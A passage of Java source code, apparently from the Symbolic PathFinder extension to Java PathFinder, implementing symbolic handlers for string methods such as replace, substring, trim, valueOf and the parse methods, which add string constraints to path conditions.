id,title,username,language,date,content
					pc.spc._addDet(comp, val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					// pc.solve();
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					// System.out.println(((PCChoiceGenerator) cg).getCurrentPC());
				}
			} else {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp.not(), sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp.not(), sym_v1, val);

					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp.not(), val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);

		}

	}

	public void handleEqualsIgnoreCase(JVMInvokeInstruction invInst,  ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - EqualsIgnoreCase"");
	}

	public void handleEndsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - EndsWith"");
		handleBooleanStringInstructions(invInst,  th, StringComparator.ENDSWITH);
	}

	public void handleContains (JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.CONTAINS);
	}


	public void handleStartsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - StartsWith"");
		handleBooleanStringInstructions(invInst, th, StringComparator.STARTSWITH);
	}

	//Only supports character for character
	public Instruction handleReplace(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleReplace"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.println(""[handleReplace] "" + s1 + "" "" + s2 + "" "" + s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				//ElementInfo e1 = th.getElementInfo(s1);
				String val = String.valueOf((char) s1);
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					//ElementInfo e2 = th.getElementInfo(s2);
					//String val1 = e2.asString();
					result = sym_v3._replace(val, String.valueOf((char)s2));
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(val, sym_v2);
					} else {
						result = sym_v3._replace(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						//ElementInfo e3 = th.getElementInfo(s3);
						String val2 = String.valueOf((char) s3);
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, val1);
					} else {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						result = sym_v3._replace(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, sym_v2);
					} else {
						result = sym_v3._replace(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			return handleSubString1(invInst, th);
		} else {
			return handleSubString2(invInst, th);
		}
	}

	public Instruction handleSubString1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString1"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				result = sym_v2._subString(val);
			} else {
				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._subString(sym_v1);
				} else {
					result = sym_v2._subString(sym_v1);
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString2(JVMInvokeInstruction invInst, ThreadInfo th) {
		//System.out.println(""[SymbolicStringHandler] doing"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_v2 = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString2"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.printf(""[SymbolicStringHandler] popped %d %d %d\n"", s1, s2, s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					int val1 = s2;
					result = sym_v3._subString(val, val1);
					//System.out.println(""[SymbolicStringHandler] special push"");
					/* Only if both arguments are concrete, something else needs
					 * to be pushed?
					 */
					//sf.push(s3, true); /* symbolic string element */
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(val, sym_v2);
					} else {
						result = sym_v3._subString(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						int val1 = s2;
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, val1);
					} else {
						int val1 = s2;
						result = sym_v3._subString(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, sym_v2);
					} else {
						result = sym_v3._subString(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.push(objRef.getObjectRef(), true);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.setOperandAttr(result);
		}

		return null;
	}

	public Instruction handleReplaceFirst(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HanldeReplaceFirst"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					ElementInfo e2 = th.getElementInfo(s2);
					String val1 = e2.asString();
					result = sym_v3._replaceFirst(val, val1);

				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(val, sym_v2);
					} else {
						result = sym_v3._replaceFirst(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, val1);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						result = sym_v3._replaceFirst(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					} else {
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleTrim(JVMInvokeInstruction invInst, ThreadInfo th) {
		// throw new RuntimeException(""ERROR: symbolic string method not Implemented - Trim"");
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		int s1 = sf.pop();

		if (sym_v1 == null) {
			ElementInfo e1 = th.getElementInfo(s1);
			String val1 = e1.asString();
			sym_v1 = new StringConstant(val1);
		}
		StringExpression result = sym_v1._trim();

		ElementInfo  objRef = th.getHeap().newString("""", th); /*
																																 * dummy String
																																 * Object
																																 */
		sf.push(objRef.getObjectRef(), true);
		sf.setOperandAttr(result);
	}

	public Instruction handleValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod(th);
		String cname = invInst.getInvokedMethodClassName();
		String[] argTypes = mi.getArgumentTypeNames();
		if (cname.equals(""java.lang.String"")) {
			// System.out.println(argTypes[0]);
			if (argTypes[0].equals(""int"")) {
				return handleIntValueOf(invInst,  th);
			} else if (argTypes[0].equals(""float"")) {
				return handleFloatValueOf(invInst, th);
			} else if (argTypes[0].equals(""long"")) {
				return handleLongValueOf(invInst, th);
			} else if (argTypes[0].equals(""double"")) {
				return handleDoubleValueOf(invInst, th);
			} else if (argTypes[0].equals(""char"")) {
				return handleCharValueOf(invInst, th);
			} else if (argTypes[0].equals(""chararray"")) {
				return handleCharArrayValueOf(invInst, th);
			} else if (argTypes[0].equals(""boolean"")) {
				return handleBooleanValueOf(invInst, th);
			} else if (argTypes[0].equals(""java.lang.Object"")) {
				return handleObjectValueOf(invInst, th);
			} else {
				throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String ValueOf"");
			}
		} else { // value of non-string types
			if (cname.equals(""java.lang.Integer"")) {
				if (!(argTypes[0].equals(""int""))) { // converting String to Integer
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseIntValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseIntValueOf(invInst,  th);
				}
			} else if (cname.equals(""java.lang.Float"")) {
				if (!(argTypes[0].equals(""float""))) { // converting String to Float
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseFloatValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseFloatValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Long"")) {
				if (!(argTypes[0].equals(""long""))) { // converting String to Long
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseLongValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Double"")) {
				if (!(argTypes[0].equals(""double""))) { // converting String to Double
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().getSystemState().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseDoubleValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Boolean"")) {
				if (!(argTypes[0].equals(""boolean""))) { // converting String to Boolean
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseBooleanValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseBooleanValueOf(invInst, th);
				}
			} else {
				throw new RuntimeException(""ERROR: Type not handled in Symbolic Type ValueOf: "" + cname);
			}
		}
		return null;
	}
	public void handleIsEmpty(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIsEmpty"");
		} else {
			IntegerExpression sym_v2 = sym_v1._length();
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if(conditionValue){
				pc._addDet(Comparator.EQ, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}else{
				pc._addDet(Comparator.NE, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);
		}
	}

	public void handleParseLongValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true); TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Boolean Format Type Exception""); 
						// TODO: to review; there should be no backtracking here
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseIntValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Integer Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseInt(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			IntegerExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._IvalueOf();
					sf.push(0, false); /* Result is don't care and an int */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					th.createAndThrowException(""java.lang.NumberFormatException"");
//					throw new RuntimeException(""ERROR: Integer Format Type Exception"");
//					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
//					//sf.push(0, true);
				}
			}
		}

	}

	public void handleParseFloat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			RealExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;
			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._RvalueOf();
					sf.push(0, false); /* Result is don't care and a float */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
					
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}

	}

	public void handleParseFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;
				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Float Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTFLOAT, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Possible Float Format Type Exception - Path Terminated"");
						
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}

	}

	public void handleParseDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				RealExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
